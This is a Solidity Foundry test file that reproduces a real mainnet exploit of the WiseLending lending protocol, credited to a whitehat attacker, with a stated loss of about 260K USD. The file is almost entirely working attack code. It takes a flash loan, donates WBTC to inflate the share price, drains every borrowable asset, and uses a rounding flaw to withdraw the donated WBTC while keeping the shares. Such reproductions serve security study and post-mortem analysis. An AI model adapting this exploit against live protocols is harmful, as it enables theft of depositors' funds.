// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~260K USD$
// Attacker : c0ffeebabe.eth (wihtehat)
// Attack Contract : https://etherscan.io/address/0x3aa228a80f50763045bdfc45012da124bd0a6809 (Mev Contract)
// Vulnerable Contract : https://etherscan.io/address/0x84524baa1951247b3a2617a843e6ece915bb9674
// Attack Tx :https://etherscan.io/tx/0x7ac4a98599596adbf12fffa2bd23e2a2d2ac7e8989b6ea043fcc412a29126555

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x84524baa1951247b3a2617a843e6ece915bb9674#code

// @Analysis
// Twitter Guy : https://twitter.com/bbbb/status/1712841315522638034
// Twitter Guy : https://twitter.com/BlockSecTeam/status/1712871304993689709

interface IPositionNFTs {
    function mintPositionForUser(address _user) external returns (uint256);
}

interface IWiseLending {
    function getTotalDepositShares(address _poolToken) external view returns (uint256);
    function getPseudoTotalPool(address _poolToken) external view returns (uint256);
    function depositExactAmount(uint256 _nftId, address _poolToken, uint256 _amount) external returns (uint256);
    function borrowExactAmount(uint256 _nftId, address _poolToken, uint256 _amount) external returns (uint256);
    function withdrawExactAmount(uint256 _nftId, address _poolToken, uint256 _amount) external returns (uint256);
}

contract ContractTest is Test {
    IERC20 WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    IERC20 wstETH = IERC20(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 aEthWETH = IERC20(0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8);
    IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 sDAI = IERC20(0x83F20F44975D03b1b09e64809B757c47f942BEeA);
    IERC20 aEthDAI = IERC20(0x018008bfb33d285247A21d44E50697654f754e63);
    IERC20 aEthUSDC = IERC20(0x98C23E9d8f34FEFb1B7BD6a91B7FF122F4e16F5c);
    IERC20 aEthUSDT = IERC20(0x23878914EFE38d27C4D67Ab83ed1b93A74D4086a);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IPositionNFTs PositionNFTs = IPositionNFTs(0x9D6d4e2AfAB382ae9B52807a4B36A8d2Afc78b07);
    IWiseLending WiseLending = IWiseLending(0x84524bAa1951247b3A2617A843e6eCe915Bb9674);
    Uni_Pair_V3 WETH_WBTC_Pair = Uni_Pair_V3(0xCBCdF9626bC03E24f779434178A73a0B4bad62eD);
    IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    Recover recover;

    function setUp() public {
        vm.createSelectFork("mainnet", 18_342_120);
        vm.label(address(WBTC), "WBTC");
        vm.label(address(wstETH), "wstETH");
        vm.label(address(WETH), "WETH");
        vm.label(address(aEthWETH), "aEthWETH");
        vm.label(address(DAI), "DAI");
        vm.label(address(sDAI), "sDAI");
        vm.label(address(aEthDAI), "aEthDAI");
        vm.label(address(aEthUSDC), "aEthUSDC");
        vm.label(address(aEthUSDT), "aEthUSDT");
        vm.label(address(USDC), "USDC");
        vm.label(address(PositionNFTs), "PositionNFTs");
        vm.label(address(WiseLending), "WiseLending");
        vm.label(address(WETH_WBTC_Pair), "WETH_WBTC_Pair");
        vm.label(address(Balancer), "Balancer");
    }

    function testExploit() public {
        WBTC.approve(address(WiseLending), type(uint256).max);

        address[] memory tokens = new address[](1);
        tokens[0] = address(WBTC);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 50 * 1e8;
        bytes memory userData = "";
        Balancer.flashLoan(address(this), tokens, amounts, userData);

        profitLog();
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        recover = new Recover();
        uint256 recoverID = recover.init(); // open recover position

        uint256 borrowerID = PositionNFTs.mintPositionForUser(address(this)); // open borrower position

        WiseLending.depositExactAmount(recoverID, address(WBTC), 1); // deposit 1 WBTC to recover, mint 1 share
        WiseLending.depositExactAmount(borrowerID, address(WBTC), 1); // deposit 1 WBTC to borrower, mint 1 share

        WBTC.transfer(address(WiseLending), 50 * 1e8 - 2); // donate ~50 WBTC to WiseLending, inflate share price

        borrowAll(borrowerID);

        recover.recover(); // recover donated WBTC

        int256 swapAmount = -int256(amounts[0] - WBTC.balanceOf(address(this)));
        WETH_WBTC_Pair.swap(
            address(this), false, swapAmount, uint160(35_991_486_685_722_499_892_781_286_346_438_453), ""
        ); // swap WETH to WBTC
        WBTC.transfer(address(Balancer), amounts[0]); // repay flash loan
    }

    function borrowAll(uint256 id) internal {
        WiseLending.borrowExactAmount(id, address(wstETH), 33_538_664_799_002_267_467); // inflate share price in _coreBorrowTokens() , borrow all wstETH
        WiseLending.borrowExactAmount(id, address(WETH), 339_996_372_423_526_589);
        WiseLending.borrowExactAmount(id, address(aEthWETH), 98_969_695_913_405_122_899);
        WiseLending.borrowExactAmount(id, address(DAI), 200_094_287_736_946_980_059);
        WiseLending.borrowExactAmount(id, address(sDAI), 16_161_480_100_000_000_000_000);
        WiseLending.borrowExactAmount(id, address(aEthDAI), 1_302_840_070_263_627_457_089);
        WiseLending.borrowExactAmount(id, address(aEthUSDC), 5_108_839_054);
        WiseLending.borrowExactAmount(id, address(aEthUSDT), 26_082_605_241);
        WiseLending.borrowExactAmount(id, address(USDC), 50_000_000);
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
        WETH.transfer(address(WETH_WBTC_Pair), uint256(amount1Delta));
    }

    function onERC721Received(address, address, uint256, bytes memory) external returns (bytes4) {
        return this.onERC721Received.selector;
    }

    function profitLog() internal {
        emit log_named_decimal_uint(
            "Attacker wstETH balance after exploit", wstETH.balanceOf(address(this)), wstETH.decimals()
        );
        emit log_named_decimal_uint(
            "Attacker aEthWETH balance after exploit", aEthWETH.balanceOf(address(this)), aEthWETH.decimals()
        );
        emit log_named_decimal_uint("Attacker DAI balance after exploit", DAI.balanceOf(address(this)), DAI.decimals());
        emit log_named_decimal_uint(
            "Attacker sDAI balance after exploit", sDAI.balanceOf(address(this)), sDAI.decimals()
        );
        emit log_named_decimal_uint(
            "Attacker aEthDAI balance after exploit", aEthDAI.balanceOf(address(this)), aEthDAI.decimals()
        );
        emit log_named_decimal_uint(
            "Attacker aEthUSDC balance after exploit", aEthUSDC.balanceOf(address(this)), aEthUSDC.decimals()
        );
        emit log_named_decimal_uint(
            "Attacker aEthUSDT balance after exploit", aEthUSDT.balanceOf(address(this)), aEthUSDT.decimals()
        );
        emit log_named_decimal_uint(
            "Attacker USDC balance after exploit", USDC.balanceOf(address(this)), USDC.decimals()
        );
    }
}

contract Recover {
    IPositionNFTs PositionNFTs = IPositionNFTs(0x9D6d4e2AfAB382ae9B52807a4B36A8d2Afc78b07);
    IWiseLending WiseLending = IWiseLending(0x84524bAa1951247b3A2617A843e6eCe915Bb9674);
    IERC20 WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    uint256 public positionID;

    function init() external returns (uint256) {
        positionID = PositionNFTs.mintPositionForUser(address(this));
        return positionID;
    }

    function recover() external {
        while (WiseLending.getPseudoTotalPool(address(WBTC)) > 2_000_000) {
            uint256 recoverAmount =
                (WiseLending.getPseudoTotalPool(address(WBTC)) - 1) / WiseLending.getTotalDepositShares(address(WBTC)); // withdraw share amount = 0 due to precision loss
            WiseLending.withdrawExactAmount(positionID, address(WBTC), recoverAmount);
        }
        WBTC.transfer(msg.sender, WBTC.balanceOf(address(this)));
    }

    function onERC721Received(address, address, uint256, bytes memory) external returns (bytes4) {
        return this.onERC721Received.selector;
    }
}
